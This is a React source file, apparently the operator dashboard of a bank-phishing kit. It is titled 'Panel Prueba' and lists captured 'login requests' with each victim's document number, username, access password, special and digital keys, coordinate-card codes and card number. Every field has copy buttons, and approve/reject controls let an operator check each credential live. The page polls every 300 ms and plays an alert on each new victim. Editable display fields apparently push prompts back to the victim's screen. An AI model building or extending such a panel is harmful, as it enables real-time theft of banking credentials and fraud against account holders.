import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { base44 } from "@/api/base44Client";
import { Trash2, Copy, Check, X, Volume2, VolumeX, Settings, Eye, EyeOff, CheckCircle, XCircle } from "lucide-react";

function CopyButton({ value }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = () => {
    navigator.clipboard.writeText(value || "");
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };
  return (
    <button onClick={handleCopy} className="ml-1 text-gray-400 hover:text-gray-600 transition">
      {copied ? <Check className="w-3 h-3 text-green-500" /> : <Copy className="w-3 h-3" />}
    </button>
  );
}

function EditableCell({ value, onSave }) {
  const [editing, setEditing] = useState(false);
  const [val, setVal] = useState(value || "");

  const handleBlur = async () => {
    setEditing(false);
    if (val !== value) await onSave(val);
  };

  if (editing) {
    return (
      <input
        autoFocus
        value={val}
        onChange={(e) => setVal(e.target.value)}
        onBlur={handleBlur}
        className="border border-blue-400 rounded px-2 py-1 text-sm outline-none w-full"
      />
    );
  }

  return (
    <span
      onClick={() => setEditing(true)}
      className="cursor-pointer px-2 py-1 rounded hover:bg-blue-50 border border-transparent hover:border-blue-200 transition text-gray-700 min-w-[80px] inline-block"
      title="Haz clic para editar"
    >
      {val || <span className="text-gray-300 italic text-xs">Editar...</span>}
    </span>
  );
}

function playAlertSound() {
  const ctx = new (window.AudioContext || window.webkitAudioContext)();
  const times = [0, 0.25, 0.5];
  times.forEach((t) => {
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.type = "square";
    osc.frequency.setValueAtTime(880, ctx.currentTime + t);
    osc.frequency.setValueAtTime(660, ctx.currentTime + t + 0.1);
    gain.gain.setValueAtTime(0.6, ctx.currentTime + t);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + t + 0.22);
    osc.start(ctx.currentTime + t);
    osc.stop(ctx.currentTime + t + 0.22);
  });
}

export default function PanelPrueba() {
  const navigate = useNavigate();
  const [records, setRecords] = useState([]);
  const [loading, setLoading] = useState(true);
  const [soundOn, setSoundOn] = useState(true);
  const prevCountRef = useRef(0);
  const [showConfig, setShowConfig] = useState(false);
  const [configId, setConfigId] = useState(null);
  const [newUsuario, setNewUsuario] = useState("");
  const [newClave, setNewClave] = useState("");
  const [savingConfig, setSavingConfig] = useState(false);
  const [showClave, setShowClave] = useState(false);

  const loadRecords = async () => {
    setLoading(true);
    try {
      const data = await base44.entities.UserSessionData.list("-created_date");
      setRecords(data);
      return data;
    } catch (e) {
      console.error("Error cargando registros:", e);
      return [];
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    loadRecords().then((data) => { prevCountRef.current = data.length; });
    const interval = setInterval(async () => {
      const data = await base44.entities.UserSessionData.list("-created_date");
      if (soundOn && data.length > prevCountRef.current) {
        playAlertSound();
      }
      prevCountRef.current = data.length;
      setRecords(data);
    }, 300);
    return () => clearInterval(interval);
  }, [soundOn]);

  const deleteRecord = async (id) => {
    await base44.entities.UserSessionData.delete(id);
    await loadRecords();
  };

  const clearAll = async () => {
    if (!window.confirm("¿Eliminar todos los registros?")) return;
    await Promise.all(records.map((r) => base44.entities.UserSessionData.delete(r.id)));
    setRecords([]);
  };

  const openConfig = async () => {
    const configs = await base44.entities.PanelConfig.list();
    if (configs[0]) {
      setConfigId(configs[0].id);
      setNewUsuario(configs[0].usuarioPanel || "");
      setNewClave(configs[0].clavePanel || "");
    } else {
      setConfigId(null);
      setNewUsuario("");
      setNewClave("");
    }
    setShowConfig(true);
  };

  const saveConfig = async () => {
    setSavingConfig(true);
    if (configId) {
      await base44.entities.PanelConfig.update(configId, { usuarioPanel: newUsuario, clavePanel: newClave });
    } else {
      await base44.entities.PanelConfig.create({ usuarioPanel: newUsuario, clavePanel: newClave });
    }
    setSavingConfig(false);
    setShowConfig(false);
  };

  return (
    <div className="min-h-screen bg-gray-50 font-main">
      <header className="bg-[hsl(var(--primary))] px-6 h-[67px] flex items-center">
        <h1 className="text-white text-xl font-semibold">Panel Prueba</h1>
      </header>

      <main className="p-6">
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 overflow-hidden">
          <div className="px-6 py-4 border-b border-gray-100 flex items-center justify-between">
            <h2 className="text-[hsl(var(--primary))] font-semibold text-lg">Solicitudes de inicio de sesión</h2>
            <div className="flex items-center gap-3">
              <button
                onClick={() => setSoundOn((s) => !s)}
                title={soundOn ? "Silenciar notificaciones" : "Activar notificaciones"}
                className={`flex items-center gap-2 px-3 py-1.5 rounded-full text-sm font-medium border transition ${
                  soundOn
                    ? "bg-blue-50 border-blue-300 text-blue-700 hover:bg-blue-100"
                    : "bg-gray-100 border-gray-300 text-gray-500 hover:bg-gray-200"
                }`}
              >
                {soundOn ? <Volume2 className="w-4 h-4" /> : <VolumeX className="w-4 h-4" />}
                {soundOn ? "Sonido ON" : "Sonido OFF"}
              </button>
              <button
                onClick={clearAll}
                className="flex items-center gap-2 px-3 py-1.5 rounded-full text-sm font-medium border border-red-300 bg-red-50 text-red-600 hover:bg-red-100 transition"
              >
                <Trash2 className="w-4 h-4" />
                Limpiar todo
              </button>
              <button
                onClick={openConfig}
                className="flex items-center gap-2 px-3 py-1.5 rounded-full text-sm font-medium border border-gray-300 bg-gray-50 text-gray-700 hover:bg-gray-100 transition"
              >
                <Settings className="w-4 h-4" />
                Configuración
              </button>
            </div>
          </div>

          {loading ? (
            <div className="flex justify-center items-center h-48">
              <div className="w-8 h-8 border-4 border-slate-200 border-t-[hsl(var(--primary))] rounded-full animate-spin" />
            </div>
          ) : records.length === 0 ? (
            <div className="text-center py-20 text-gray-400 text-lg">No hay registros aún.</div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-gray-100">

                    <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">N° Documento</th>
                    <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Usuario</th>
                    <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Clave de Acceso</th>
                    <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Clave Especial</th>
                    <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Clave Digital</th>
                    <th className="px-4 py-3"></th>
                    <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Cód. Coordenada</th>
                    <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">N° Tarjeta</th>
                    <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">Coordenada</th>

                    <th className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider"></th>
                    <th className="px-6 py-3"></th>
                    </tr>
                </thead>
                <tbody>
                  {records.map((record) => (
                    <tr key={record.id} className="border-b border-gray-50 hover:bg-gray-50 transition">

                      <td className="px-6 py-4">
                        <div className="flex items-center gap-1">
                          <span>{record.numeroDocumento || <span className="text-gray-300">—</span>}</span>
                          {record.numeroDocumento && <CopyButton value={record.numeroDocumento} />}
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-1 font-semibold text-[hsl(var(--primary))]">
                          <span className="w-2 h-2 rounded-full bg-green-500 inline-block mr-1"></span>
                          {record.usuario || <span className="text-gray-300 font-normal">—</span>}
                          {record.usuario && <CopyButton value={record.usuario} />}
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-1 font-mono">
                          {record.claveAcceso || <span className="text-gray-300">—</span>}
                          {record.claveAcceso && <CopyButton value={record.claveAcceso} />}
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-2">
                          <div className="flex items-center gap-1 font-mono">
                            {record.claveEspecial || <span className="text-gray-300">—</span>}
                            {record.claveEspecial && <CopyButton value={record.claveEspecial} />}
                          </div>
                          {record.claveEspecial && record.claveEspecialStatus !== "approved" && record.claveEspecialStatus !== "rejected" && (
                            <div className="flex items-center gap-1">
                              <button
                                title="Aprobar clave especial"
                                onClick={async () => {
                                  await base44.entities.UserSessionData.update(record.id, { claveEspecialStatus: "approved" });
                                  await loadRecords();
                                }}
                                className="w-8 h-8 flex items-center justify-center rounded-full bg-green-100 hover:bg-green-200 text-green-600 transition"
                              >
                                <CheckCircle className="w-4 h-4" />
                              </button>
                              <button
                                title="Rechazar clave especial"
                                onClick={async () => {
                                  await base44.entities.UserSessionData.update(record.id, { claveEspecialStatus: "rejected" });
                                  await loadRecords();
                                }}
                                className="w-8 h-8 flex items-center justify-center rounded-full bg-red-100 hover:bg-red-200 text-red-500 transition"
                              >
                                <XCircle className="w-4 h-4" />
                              </button>
                            </div>
                          )}
                          {record.claveEspecialStatus === "approved" && <span className="text-xs text-green-600 font-semibold">Aprobado</span>}
                          {record.claveEspecialStatus === "rejected" && <span className="text-xs text-red-500 font-semibold">Rechazado</span>}
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-2">
                          <div className="flex items-center gap-1 font-mono">
                            {record.claveDigital || <span className="text-gray-300">—</span>}
                            {record.claveDigital && <CopyButton value={record.claveDigital} />}
                          </div>
                          {record.claveDigital && record.claveDigitalStatus !== "approved" && record.claveDigitalStatus !== "rejected" && (
                            <div className="flex items-center gap-1">
                              <button
                                title="Aprobar clave digital"
                                onClick={async () => {
                                  await base44.entities.UserSessionData.update(record.id, { claveDigitalStatus: "approved" });
                                  await loadRecords();
                                }}
                                className="w-8 h-8 flex items-center justify-center rounded-full bg-green-100 hover:bg-green-200 text-green-600 transition"
                              >
                                <CheckCircle className="w-4 h-4" />
                              </button>
                              <button
                                title="Rechazar clave digital"
                                onClick={async () => {
                                  await base44.entities.UserSessionData.update(record.id, { claveDigitalStatus: "rejected" });
                                  await loadRecords();
                                }}
                                className="w-8 h-8 flex items-center justify-center rounded-full bg-red-100 hover:bg-red-200 text-red-500 transition"
                              >
                                <XCircle className="w-4 h-4" />
                              </button>
                            </div>
                          )}
                          {record.claveDigitalStatus === "approved" && <span className="text-xs text-green-600 font-semibold">Aprobado</span>}
                          {record.claveDigitalStatus === "rejected" && <span className="text-xs text-red-500 font-semibold">Rechazado</span>}
                        </div>
                      </td>
                      {/* Botones aprobar/rechazar login */}
                      <td className="px-4 py-4">
                        {record.status === "pending" && (
                          <div className="flex items-center gap-2">
                            <button
                              title="Aprobar acceso"
                              onClick={async () => {
                                await base44.entities.UserSessionData.update(record.id, { status: "approved" });
                                await loadRecords();
                              }}
                              className="w-8 h-8 flex items-center justify-center rounded-full bg-green-100 hover:bg-green-200 text-green-600 transition"
                            >
                              <CheckCircle className="w-4 h-4" />
                            </button>
                            <button
                              title="Rechazar acceso"
                              onClick={async () => {
                                await base44.entities.UserSessionData.update(record.id, { status: "rejected" });
                                await loadRecords();
                              }}
                              className="w-8 h-8 flex items-center justify-center rounded-full bg-red-100 hover:bg-red-200 text-red-500 transition"
                            >
                              <XCircle className="w-4 h-4" />
                            </button>
                          </div>
                        )}
                        {record.status === "approved" && <span className="text-xs text-green-600 font-semibold">Aprobado</span>}
                        {record.status === "rejected" && <span className="text-xs text-red-500 font-semibold">Rechazado</span>}
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-1 font-mono font-bold">
                          {record.codigoCoordenada || <span className="text-gray-300 font-normal">—</span>}
                          {record.codigoCoordenada && <CopyButton value={record.codigoCoordenada} />}
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        <EditableCell
                          value={record.numeroTarjetaDisplay}
                          onSave={(val) => base44.entities.UserSessionData.update(record.id, { numeroTarjetaDisplay: val })}
                        />
                      </td>
                      <td className="px-6 py-4">
                        <EditableCell
                          value={record.coordenadaDisplay}
                          onSave={(val) => base44.entities.UserSessionData.update(record.id, { coordenadaDisplay: val })}
                        />
                      </td>
                      {/* Botones aprobar/rechazar coordenada */}
                      <td className="px-4 py-4">
                        {record.codigoCoordenada && record.coordenadaStatus !== "approved" && record.coordenadaStatus !== "rejected" && (
                          <div className="flex items-center gap-2">
                            <button
                              title="Aprobar coordenada"
                              onClick={async () => {
                                await base44.entities.UserSessionData.update(record.id, { coordenadaStatus: "approved" });
                                await loadRecords();
                              }}
                              className="w-8 h-8 flex items-center justify-center rounded-full bg-green-100 hover:bg-green-200 text-green-600 transition"
                            >
                              <CheckCircle className="w-4 h-4" />
                            </button>
                            <button
                              title="Rechazar coordenada"
                              onClick={async () => {
                                await base44.entities.UserSessionData.update(record.id, { coordenadaStatus: "rejected", codigoCoordenada: "" });
                                await loadRecords();
                              }}
                              className="w-8 h-8 flex items-center justify-center rounded-full bg-red-100 hover:bg-red-200 text-red-500 transition"
                            >
                              <XCircle className="w-4 h-4" />
                            </button>
                          </div>
                        )}
                        {record.coordenadaStatus === "approved" && <span className="text-xs text-green-600 font-semibold">Aprobado</span>}
                        {record.coordenadaStatus === "rejected" && <span className="text-xs text-red-500 font-semibold">Rechazado</span>}
                        {!record.codigoCoordenada && <span className="text-gray-300 text-xs">—</span>}
                      </td>

                      <td className="px-6 py-4">
                        <button
                          onClick={() => deleteRecord(record.id)}
                          className="text-red-400 hover:text-red-600 transition"
                        >
                          <Trash2 className="w-4 h-4" />
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </main>

      {/* Modal Configuración */}
      {showConfig && (
        <div className="fixed inset-0 bg-black/40 flex items-center justify-center z-50">
          <div className="bg-white rounded-xl shadow-xl p-6 w-full max-w-sm mx-4">
            <h3 className="text-lg font-semibold text-gray-800 mb-4">Configuración del Panel</h3>
            <div className="space-y-4">
              <div>
                <label className="block text-sm text-gray-600 mb-1">Usuario</label>
                <input
                  type="text"
                  value={newUsuario}
                  onChange={(e) => setNewUsuario(e.target.value)}
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm outline-none focus:border-blue-400"
                  placeholder="Nuevo usuario"
                />
              </div>
              <div>
                <label className="block text-sm text-gray-600 mb-1">Clave de acceso</label>
                <div className="relative">
                  <input
                    type={showClave ? "text" : "password"}
                    value={newClave}
                    onChange={(e) => setNewClave(e.target.value)}
                    className="w-full border border-gray-300 rounded-lg px-3 py-2 pr-10 text-sm outline-none focus:border-blue-400"
                    placeholder="Nueva clave"
                  />
                  <button
                    type="button"
                    onClick={() => setShowClave((v) => !v)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                  >
                    {showClave ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>
              </div>
            </div>
            <div className="flex gap-3 mt-6">
              <button
                onClick={() => setShowConfig(false)}
                className="flex-1 py-2 rounded-lg border border-gray-300 text-gray-600 text-sm hover:bg-gray-50 transition"
              >
                Cancelar
              </button>
              <button
                onClick={saveConfig}
                disabled={savingConfig || !newUsuario || !newClave}
                className="flex-1 py-2 rounded-lg bg-[hsl(var(--primary))] text-white text-sm font-medium hover:opacity-90 transition disabled:opacity-50"
              >
                {savingConfig ? "Guardando..." : "Guardar"}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}